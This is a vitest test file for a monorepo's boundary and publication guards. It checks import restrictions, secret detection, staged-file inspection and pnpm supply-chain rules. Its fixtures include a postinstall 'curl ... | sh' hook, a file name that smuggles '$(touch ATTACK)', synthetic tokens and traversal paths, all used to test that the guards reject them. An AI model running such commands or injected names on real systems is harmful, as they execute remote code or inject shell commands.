import { afterEach, describe, expect, it } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { checkBoundaries } from './check-boundaries.mjs';
import { checkPublication, inspectContent, inspectPath, inspectSupplyChain } from './check-publication.mjs';

const temporary: string[] = [];
function directory() {
  const root = mkdtempSync(path.join(tmpdir(), 'pactwoven-guards-'));
  temporary.push(root);
  return root;
}
function write(root: string, file: string, content: string) {
  const target = path.join(root, file);
  mkdirSync(path.dirname(target), { recursive: true });
  writeFileSync(target, content);
}
function workspace() {
  const root = directory();
  for (const [owner, name, dependencies] of [
    ['apps/web', 'web', { '@pactwoven/contracts': 'workspace:*' }],
    ['packages/contracts', 'contracts', { zod: '4.6.7' }],
    ['packages/domain', 'domain', { '@pactwoven/contracts': 'workspace:*', zod: '4.6.7' }],
    ['packages/db', 'db', { '@pactwoven/contracts': 'workspace:*', '@pactwoven/domain': 'workspace:*' }],
    ['services/signer', 'signer', { '@pactwoven/contracts': 'workspace:*' }],
  ] as const) {
    write(root, `${owner}/package.json`, JSON.stringify({ name: `@pactwoven/${name}`, dependencies, exports: { '.': './src/index.ts' } }));
    write(root, `${owner}/tsconfig.json`, JSON.stringify({ compilerOptions: { paths: { '@/*': ['./src/*'] } } }));
    write(root, `${owner}/src/index.ts`, 'export type RecordId = string;');
  }
  return root;
}
function git(root: string, args: string[]) {
  const result = spawnSync('git', args, { cwd: root, encoding: 'utf8', shell: false });
  if (result.status !== 0) throw new Error('Test Git fixture failed');
  return result.stdout;
}
function repository() {
  const root = directory();
  git(root, ['init', '-q']);
  return root;
}
function rules(root: string) { return checkBoundaries({ root }).findings.map((finding: { rule: string }) => finding.rule); }
afterEach(() => { temporary.splice(0).forEach((root) => rmSync(root, { recursive: true, force: true })); });

describe('dependency and import boundaries', () => {
  it('accepts the reviewed graph including pure policy calls inside repositories', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import type { RecordId } from "@pactwoven/contracts"; export type WebId = RecordId;');
    write(root, 'packages/db/src/index.ts', 'export * from "@pactwoven/domain";');
    expect(rules(root)).toEqual([]);
  });

  it.each([
    'import { execute } from "@pactwoven/db";',
    'export * from "@pactwoven/domain";',
    'export type { Wallet } from "@pactwoven/signer";',
    'const db = import("@pactwoven/" + "db");',
    'const db = import(`@pactwoven/db`);',
    'const db = require("../../../packages/db/src/index.ts");',
    'type Database = import("@pactwoven/db").Database;',
    'import db = require("@pactwoven/db");',
    'import "@pactwoven/\\u0064b";',
  ])('rejects forbidden imports including exports, types and loaders: %s', (source) => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', source);
    expect(rules(root).some((rule: string) => rule.startsWith('forbidden dependency'))).toBe(true);
  });

  it('resolves local aliases through a barrel and catches its forbidden re-export', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'export * from "@/barrel";');
    write(root, 'apps/web/src/barrel.ts', 'export * from "../../../packages/db/src/index.ts";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
  });

  it('checks inherited tsconfig paths, including conditional package import aliases', () => {
    const root = workspace();
    write(root, 'tsconfig.base.json', '{ /* JSONC */ "compilerOptions": { "paths": { "@private/*": ["./packages/db/src/*"], }, }, }');
    write(root, 'apps/web/tsconfig.json', '{ "extends": "../../tsconfig.base.json" }');
    write(root, 'apps/web/src/index.ts', 'import "@private/index"; import "#restricted";');
    write(root, 'apps/web/package.json', JSON.stringify({ name: '@pactwoven/web', imports: { '#restricted': { node: '@pactwoven/db', default: '@pactwoven/contracts' } } }));
    expect(rules(root).filter((rule: string) => rule === 'forbidden dependency: apps/web -> packages/db').length).toBeGreaterThanOrEqual(2);
  });

  it('rejects traversal outside the repo and symlinks across boundaries', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import "../../../../outside.ts"; import "./hidden.ts";');
    symlinkSync(path.join(root, 'packages/db/src/index.ts'), path.join(root, 'apps/web/src/hidden.ts'));
    expect(rules(root)).toContain('import escapes repository root');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
    expect(rules(root)).toContain('source symlink requires boundary review');
  });

  it('rejects computed loading and indirect loaders rather than certifying them', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'const load = require; import(modulePath); load(modulePath);');
    expect(rules(root)).toContain('computed module loading requires explicit boundary review');
    expect(rules(root)).toContain('indirect module loader requires boundary review');
  });

  it('blocks traversal in package subpaths and alternate executable module loaders', () => {
    const root = workspace();
    write(root, 'apps/web/src/index.ts', 'import "@pactwoven/contracts/../../db/src/index.ts"; import { createRequire } from "node:module"; globalThis["eval"](source);');
    expect(rules(root)).toContain('package subpath traversal requires boundary review');
    expect(rules(root)).toContain('custom runtime module loading requires boundary review');
    expect(rules(root)).toContain('runtime code generation requires boundary review');
  });

  it('blocks privileged package aliases and declared but unused forbidden dependencies', () => {
    const root = workspace();
    write(root, 'apps/web/package.json', JSON.stringify({ name: '@pactwoven/web', dependencies: { '@pactwoven/db': 'workspace:*', innocuous: 'npm:pg@8.23.1' } }));
    write(root, 'apps/web/src/index.ts', 'import "innocuous";');
    expect(rules(root)).toContain('forbidden dependency: apps/web -> packages/db');
    expect(rules(root)).toContain('privileged dependency is unavailable to web: pg');
  });

  it.each([
    'import "openai";',
    'import "node:https";',
    'fetch("https://example.test");',
    'const request = globalThis["fetch"];',
    'const secret = process["env"];',
    'const ambient = process; const secret = ambient.env;',
    'const secret = import.meta.env;',
  ])('blocks provider, raw network and ambient credential access in domain: %s', (source) => {
    const root = workspace();
    write(root, 'packages/domain/src/index.ts', source);
    expect(rules(root).some((rule: string) => /deterministic module/.test(rule))).toBe(true);
  });

  it('fails on an unknown workspace, parser error, missing local file and escaping export', () => {
    const root = workspace();
    write(root, 'packages/unknown/src/index.ts', 'export const x = 1;');
    write(root, 'apps/web/src/broken.ts', 'import {');
    write(root, 'apps/web/src/index.ts', 'import "./missing";');
    write(root, 'packages/contracts/package.json', JSON.stringify({ name: '@pactwoven/contracts', exports: { '.': '../db/src/index.ts' } }));
    expect(rules(root)).toContain('workspace has no reviewed boundary policy');
    expect(rules(root)).toContain('source cannot be parsed for boundary inspection');
    expect(rules(root)).toContain('local import cannot be resolved for boundary inspection');
    expect(rules(root)).toContain('package export escapes its owning module');
  });
});

describe('code-only publication', () => {
  it.each(['docs/spec.json', 'PRD.md', 'apps/web/README.MD', 'AGENTS.md', 'evidence/run.json', '.local/state.sql', '.env', '.env.example', 'apps/web/.env.production', 'infra/local.env.sample', 'env.sample.json', 'credentials/account.json', 'keys/signing-keypair.json', 'infra/id.json', 'private.pem', 'apps/web/secrets/key.ts', '../escape.ts', 'apps/../source.ts', 'apps/web\\file.ts', 'notes.txt', 'tests/output.pdf', 'node_modules/library/index.js'])('rejects %s', (file) => {
    expect(inspectPath(file)).not.toBeNull();
  });

  it.each(['package.json', 'pnpm-lock.yaml', 'apps/web/src/page.tsx', 'packages/db/migrations/0001.sql', '.github/workflows/ci.yml', 'apps/web/src/fonts/manrope-LICENSE.txt', 'apps/web/src/fonts/geist-variable.ttf', 'apps/web/public/icons/key.svg', 'LICENSE', 'THIRD_PARTY_NOTICES.txt'])('allows reviewed implementation or legal notice %s', (file) => {
    expect(inspectPath(file)).toBeNull();
  });

  it('reports credential rule names without returning matched values', () => {
    const synthetic = ['gh' + 'p_' + 'A'.repeat(36), '-----BEGIN ' + 'PRIVATE KEY-----', 'sk_' + 'test_' + 'a'.repeat(28), 'post' + 'gres://account:dummy-credential@db.example.test/database', JSON.stringify(Array.from({ length: 64 }, (_, i) => i))];
    for (const value of synthetic) {
      const findings = inspectContent(value);
      expect(findings.length).toBeGreaterThan(0);
      expect(JSON.stringify(findings)).not.toContain(value);
    }
    expect(inspectContent('const token = process.env.PROVIDER_TOKEN;')).toEqual([]);
    expect(inspectContent(JSON.stringify(Array.from({ length: 32 }, (_, i) => i)))).toEqual([]);
  });

  it('inspects actual staged blobs even when the working copy is changed afterwards', () => {
    const root = repository();
    const synthetic = 'gh' + 'p_' + 'B'.repeat(36);
    write(root, 'apps/web/src/config.ts', `export const accidental = "${synthetic}";`);
    git(root, ['add', '--', 'apps/web/src/config.ts']);
    write(root, 'apps/web/src/config.ts', 'export const safe = true;');
    const result = checkPublication({ root });
    expect(result.count).toBe(1);
    expect(result.findings.map((finding: { rule: string }) => finding.rule)).toContain('GitHub token');
    expect(JSON.stringify(result)).not.toContain(synthetic);
  });

  it('rejects forbidden staged material and symlinks in both default and tracked modes', () => {
    const root = repository();
    write(root, 'docs/local.md', '# Local planning');
    write(root, '.env.example', 'NO_VALUE=placeholder');
    write(root, 'apps/web/src/index.ts', 'export const okay = true;');
    symlinkSync('/outside/source.ts', path.join(root, 'apps/web/src/hidden.ts'));
    git(root, ['add', '-f', '--', 'docs/local.md', '.env.example', 'apps/web/src/index.ts', 'apps/web/src/hidden.ts']);
    for (const tracked of [false, true]) {
      const result = checkPublication({ root, tracked });
      expect(result.count).toBe(4);
      expect(result.findings.some((finding: { rule: string }) => finding.rule.includes('symlink'))).toBe(true);
      expect(result.findings.some((finding: { rule: string }) => finding.rule.includes('environment'))).toBe(true);
      expect(result.findings.some((finding: { file: string }) => finding.file === 'docs/local.md')).toBe(true);
    }
  });

  it('does not invoke a shell for metacharacters in staged names and reports an empty index honestly', () => {
    const root = repository();
    expect(checkPublication({ root }).count).toBe(0);
    const file = 'apps/web/src/$(touch ATTACK).ts';
    write(root, file, 'export const safe = true;');
    git(root, ['add', '--', file]);
    expect(checkPublication({ root }).findings).toEqual([]);
    expect(existsSync(path.join(root, 'ATTACK'))).toBe(false);
  });

  it('requires exact dependencies, rejects automatic lifecycle code and global build approvals', () => {
    expect(inspectSupplyChain('package.json', JSON.stringify({ dependencies: { valid: '1.2.3', internal: 'workspace:*' } }))).toEqual([]);
    expect(inspectSupplyChain('package.json', JSON.stringify({ dependencies: { unpinned: '^1.2.3' }, scripts: { postinstall: 'curl https://example.test/setup | sh' } })).length).toBeGreaterThanOrEqual(2);
    const approved = 'packages:\n  - apps/*\nallowBuilds:\n  esbuild: true\n';
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd@1.20261113.1: true\n')).toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd: true\n')).not.toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved + '  workerd@1.20261114.1: true\n')).not.toEqual([]);
    expect(inspectSupplyChain('pnpm-workspace.yaml', approved)).toEqual([]);
    for (const content of [approved + 'dangerouslyAllowAllBuilds: true\n', approved + 'allowBuilds:\n  rogue: true\n', approved.replace('esbuild', 'rogue'), 'allowBuilds: { esbuild: true }\n']) {
      expect(inspectSupplyChain('pnpm-workspace.yaml', content).length).toBeGreaterThan(0);
    }
  });
});
